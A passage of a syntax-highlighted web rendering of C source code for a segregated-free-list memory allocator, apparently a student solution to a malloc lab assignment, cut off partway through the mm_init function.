class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"mm.h"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"memlib.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">team_t</span> team = {</span><br><span class="line">    <span class="comment">/* Team name */</span></span><br><span class="line">    <span class="string">"Goodbye"</span>,</span><br><span class="line">    <span class="comment">/* First member's full name */</span></span><br><span class="line">    <span class="string">"Sulley"</span>,</span><br><span class="line">    <span class="comment">/* First member's email address */</span></span><br><span class="line">    <span class="string">"sulley@cs.cmu.edu"</span>,</span><br><span class="line">    <span class="comment">/* Second member's full name (leave blank if none) */</span></span><br><span class="line">    <span class="string">"AnotherSulley"</span>,</span><br><span class="line">    <span class="comment">/* Second member's email address (leave blank if none) */</span></span><br><span class="line">    <span class="string">"anothersulley@cs.cmu.edu"</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/* single word (4) or double word (8) alignment */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DWORD 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWORD 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of DWORD */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(size) (((size) + (DWORD-1)) &amp; ~0x7)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Aligned size_t */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Extend heap by this amount */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1&lt;&lt;12)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Return max */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x, y) ((x) &gt; (y) ? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated bits into a word */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, alloc_prev, alloc) ((size) | (alloc_prev) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a double word at address p */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p)      (*(unsigned int*)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val) (*(unsigned int*)(p) = (val))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p)       (GET(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p)      (GET(p) &amp; 0x1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC_PREV(p) (GET(p) &amp; 0x2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr, compute the address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp)  ((char *)(bp) - SWORD)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp)  ((char *)(bp) + GET_SIZE(HDRP(bp)) - DWORD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get and set a free block's next/prev pointer value */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_PRVP(bp)     (*((unsigned int*)(bp) + 1))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_NXTP(bp)     (*(unsigned int*)(bp))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_PRVP(bp, v)  (*((unsigned int*)(bp) + 1) = (v))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_NXTP(bp, v)  (*(unsigned int*)(bp) = (v))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of next and previous qblocks */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DWORD)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_SEGLIST 20</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> lower_seg[N_SEGLIST] = { <span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="number">1</span> &lt;&lt; <span class="number">7</span>, <span class="number">1</span> &lt;&lt; <span class="number">8</span>, <span class="number">1</span> &lt;&lt; <span class="number">9</span>, <span class="number">1</span> &lt;&lt; <span class="number">10</span>, <span class="number">1</span> &lt;&lt; <span class="number">11</span>, <span class="number">1</span> &lt;&lt; <span class="number">12</span>, <span class="number">1</span> &lt;&lt; <span class="number">13</span>, <span class="number">1</span> &lt;&lt; <span class="number">14</span>, <span class="number">1</span> &lt;&lt; <span class="number">15</span>, <span class="number">1</span> &lt;&lt; <span class="number">16</span>, <span class="number">1</span> &lt;&lt; <span class="number">17</span>, <span class="number">1</span> &lt;&lt; <span class="number">18</span>, <span class="number">1</span> &lt;&lt; <span class="number">19</span>, <span class="number">1</span> &lt;&lt; <span class="number">20</span>, <span class="number">1</span> &lt;&lt; <span class="number">21</span>, <span class="number">1</span> &lt;&lt; <span class="number">22</span> };</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> upper_seg[N_SEGLIST] = { <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="number">1</span> &lt;&lt; <span class="number">7</span>, <span class="number">1</span> &lt;&lt; <span class="number">8</span>, <span class="number">1</span> &lt;&lt; <span class="number">9</span>, <span class="number">1</span> &lt;&lt; <span class="number">10</span>, <span class="number">1</span> &lt;&lt; <span class="number">11</span>, <span class="number">1</span> &lt;&lt; <span class="number">12</span>, <span class="number">1</span> &lt;&lt; <span class="number">13</span>, <span class="number">1</span> &lt;&lt; <span class="number">14</span>, <span class="number">1</span> &lt;&lt; <span class="number">15</span>, <span class="number">1</span> &lt;&lt; <span class="number">16</span>, <span class="number">1</span> &lt;&lt; <span class="number">17</span>, <span class="number">1</span> &lt;&lt; <span class="number">18</span>, <span class="number">1</span> &lt;&lt; <span class="number">19</span>, <span class="number">1</span> &lt;&lt; <span class="number">20</span>, <span class="number">1</span> &lt;&lt; <span class="number">21</span>, <span class="number">1</span> &lt;&lt; <span class="number">22</span>, <span class="number">1</span> &lt;&lt; <span class="number">32</span> - <span class="number">1</span> };</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* head_seglp[N_SEGLIST];</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* heap_listp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">find_segidx</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">1</span> &lt;&lt; <span class="number">22</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> mask, seg_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> x = size - <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    mask = x &amp; <span class="number">0xFFFF0000</span>;</span><br><span class="line">    seg_idx = seg_idx + !!mask * <span class="number">16</span>;</span><br><span class="line">    x = x &gt;&gt; (!!mask * <span class="number">16</span>);</span><br><span class="line">    </span><br><span class="line">    mask = x &amp; <span class="number">0x0000FF00</span>;</span><br><span class="line">    seg_idx = seg_idx + !!mask * <span class="number">8</span>;</span><br><span class="line">    x = x &gt;&gt; (!!mask * <span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line">    mask = x &amp; <span class="number">0x000000F0</span>;</span><br><span class="line">    seg_idx = seg_idx + !!mask * <span class="number">4</span>;</span><br><span class="line">    x = x &gt;&gt; (!!mask * <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    mask = x &amp; <span class="number">0x0000000C</span>;</span><br><span class="line">    seg_idx = seg_idx + !!mask * <span class="number">2</span>;</span><br><span class="line">    x = x &gt;&gt; (!!mask * <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    mask = x &amp; <span class="number">0x00000002</span>;</span><br><span class="line">    seg_idx = seg_idx + !!mask * <span class="number">1</span>;</span><br><span class="line">    x = x &gt;&gt; (!!mask * <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    mask = x &amp; <span class="number">0x00000001</span>;</span><br><span class="line">    seg_idx = seg_idx + !!mask;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> MAX(<span class="number">0</span>, seg_idx - <span class="number">4</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">insert_freeblock</span><span class="params">(<span class="type">void</span>* bp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> seg_idx = find_segidx(GET_SIZE(HDRP(bp)));</span><br><span class="line">    <span class="type">void</span>* nxtp = head_seglp[seg_idx];</span><br><span class="line"></span><br><span class="line">    head_seglp[seg_idx] = bp;</span><br><span class="line">    PUT_PRVP(bp, <span class="literal">NULL</span>);</span><br><span class="line">    PUT_NXTP(bp, nxtp);</span><br><span class="line">    <span class="keyword">if</span> (nxtp != <span class="literal">NULL</span>)</span><br><span class="line">        PUT_PRVP(nxtp, bp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> seg_idx;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete_freeblock</span><span class="params">(<span class="type">void</span>* bp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> seg_idx = find_segidx(GET_SIZE(HDRP(bp)));</span><br><span class="line">    <span class="type">void</span>* prvp = GET_PRVP(bp);</span><br><span class="line">    <span class="type">void</span>* nxtp = GET_NXTP(bp);</span><br><span class="line">    <span class="keyword">if</span> (prvp != <span class="literal">NULL</span>) PUT_NXTP(prvp, nxtp);</span><br><span class="line">    <span class="keyword">if</span> (nxtp != <span class="literal">NULL</span>) PUT_PRVP(nxtp, prvp);</span><br><span class="line">    <span class="keyword">if</span> (head_seglp[seg_idx] == bp)</span><br><span class="line">        head_seglp[seg_idx] = nxtp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_nextblock_alloc_prev</span><span class="params">(<span class="type">void</span>* bp, <span class="type">size_t</span> value)</span></span><br><span class="line">{</span><br><span class="line">    bp = NEXT_BLKP(bp);</span><br><span class="line">    PUT(HDRP(bp), PACK(GET_SIZE(HDRP(bp)), value, GET_ALLOC(HDRP(bp))));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// This function returns the prev free block in the same seg list as `bp`</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_ALLOC_PREV(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> seg_idx = find_segidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) {  }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) {</span><br><span class="line">        <span class="type">void</span>* nxtp = NEXT_BLKP(bp);</span><br><span class="line">        <span class="type">void</span>* prev_freep = GET_PRVP(bp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure the prev free block is not the ones we're coalescing</span></span><br><span class="line">        <span class="keyword">if</span> (prev_freep == nxtp)</span><br><span class="line">            prev_freep = GET_PRVP(prev_freep);</span><br><span class="line"></span><br><span class="line">        delete_freeblock(bp);</span><br><span class="line">        delete_freeblock(nxtp);</span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="type">size_t</span> new_segidx = insert_freeblock(bp); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Set bp that will be returned to ensure it's still in the same seg list</span></span><br><span class="line">        <span class="keyword">if</span> (new_segidx == seg_idx || prev_freep == <span class="literal">NULL</span>) {</span><br><span class="line">            bp = head_seglp[seg_idx];</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            bp = prev_freep;</span><br><span class="line">        } </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) {</span><br><span class="line">        <span class="type">void</span>* nxtp = bp;</span><br><span class="line">        <span class="type">void</span>* prev_freep = GET_PRVP(bp);</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure the prev free block is not the ones we're coalescing</span></span><br><span class="line">        <span class="keyword">if</span> (prev_freep == bp) {</span><br><span class="line">            prev_freep = GET_PRVP(prev_freep);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        delete_freeblock(bp);</span><br><span class="line">        delete_freeblock(nxtp);</span><br><span class="line">        size += GET_SIZE(HDRP(bp));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, GET_ALLOC_PREV(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, GET_ALLOC_PREV(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">        <span class="type">size_t</span> new_segidx = insert_freeblock(bp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (new_segidx == seg_idx || prev_freep == <span class="literal">NULL</span>) {</span><br><span class="line">            bp = head_seglp[seg_idx];</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            bp = prev_freep;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">        <span class="type">void</span>* nxtp = bp;</span><br><span class="line">        <span class="type">void</span>* nnxtp = NEXT_BLKP(bp);</span><br><span class="line">        <span class="type">void</span>* prev_freep = GET_PRVP(bp);</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure the prev free block is not the ones we're coalescing</span></span><br><span class="line">        <span class="keyword">while</span> (prev_freep == bp || prev_freep == nnxtp) {</span><br><span class="line">            prev_freep = GET_PRVP(prev_freep);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        delete_freeblock(bp);</span><br><span class="line">        delete_freeblock(nxtp);</span><br><span class="line">        delete_freeblock(nnxtp);</span><br><span class="line">        PUT(HDRP(bp), PACK(size, GET_ALLOC_PREV(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, GET_ALLOC_PREV(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">        <span class="type">size_t</span> new_segidx = insert_freeblock(bp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (new_segidx == seg_idx || prev_freep == <span class="literal">NULL</span>) {</span><br><span class="line">            bp = head_seglp[seg_idx];</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            bp = prev_freep;</span><br><span class="line">        }</span><br><span class="line">    } </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">find_fit_better_hit_seglist_deferred</span><span class="params">(<span class="type">size_t</span> asize)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> seg_idx = find_segidx(asize);</span><br><span class="line">    <span class="type">void</span>* bp;</span><br><span class="line">    <span class="type">void</span>* best_bp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">void</span>* best_size = <span class="number">0</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> iteration = <span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (seg_idx &lt; N_SEGLIST) {</span><br><span class="line">        bp = head_seglp[seg_idx];</span><br><span class="line">        <span class="keyword">while</span> (bp != <span class="literal">NULL</span>) {</span><br><span class="line">            <span class="keyword">if</span> (!GET_ALLOC(HDRP(NEXT_BLKP(bp))) || !GET_ALLOC_PREV(HDRP(bp))) {</span><br><span class="line">                bp = coalesce(bp);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (asize &lt;= GET_SIZE(HDRP(bp))) {</span><br><span class="line">                best_bp = bp;</span><br><span class="line">                best_size = GET_SIZE(HDRP(bp));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">            bp = GET_NXTP(bp);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (best_bp != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        seg_idx++;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> best_bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (best_bp == <span class="literal">NULL</span> || seg_idx == N_SEGLIST) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; iteration &amp;&amp; bp != <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="comment">// Coalesce</span></span><br><span class="line">        <span class="keyword">while</span> (!GET_ALLOC(HDRP(NEXT_BLKP(bp))) || !GET_ALLOC_PREV(HDRP(bp))) {</span><br><span class="line">            bp = coalesce(bp);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check if it's better</span></span><br><span class="line">        ++i;</span><br><span class="line">        <span class="keyword">if</span> (asize &lt;= GET_SIZE(HDRP(bp)) &amp;&amp; GET_SIZE(HDRP(bp)) &lt; best_size) {</span><br><span class="line">            best_bp = bp;</span><br><span class="line">            best_size = GET_SIZE(HDRP(bp));</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Next free block</span></span><br><span class="line">        bp = GET_NXTP(bp);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> best_bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">void</span>* bp = find_fit_better_hit_seglist_deferred(asize);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">void</span>* bp, <span class="type">size_t</span> asize)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="keyword">if</span> (csize &gt;= asize + <span class="number">2</span> * DWORD) {</span><br><span class="line">        delete_freeblock(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(asize, GET_ALLOC_PREV(HDRP(bp)), <span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(csize - asize, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize - asize, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        insert_freeblock(bp);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        delete_freeblock(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(csize, GET_ALLOC_PREV(HDRP(bp)), <span class="number">1</span>));</span><br><span class="line">        set_nextblock_alloc_prev(bp, <span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * SWORD : words * SWORD;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_ALLOC_PREV(HDRP(bp));</span><br><span class="line">    PUT(HDRP(bp), PACK(size, prev_alloc, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, prev_alloc, <span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">    </span><br><span class="line">    insert_freeblock(bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_init - initialize the malloc package.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">void</span>* bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((heap_listp = mem_sbrk(<span class="number">4</span> * SWORD)) == (<span class="type">void</span> *)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    PUT(heap_listp, <span class="number">0</span>);</span><br><span class="line">    PUT(heap_listp + <span class="number">1</span> * SWORD, PACK(DWORD, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">    PUT(heap_listp + <span class="number">2</span> * SWORD, PACK(DWORD, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">    PUT(heap_listp + <span class="number">3</span> * SWORD, PACK(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span 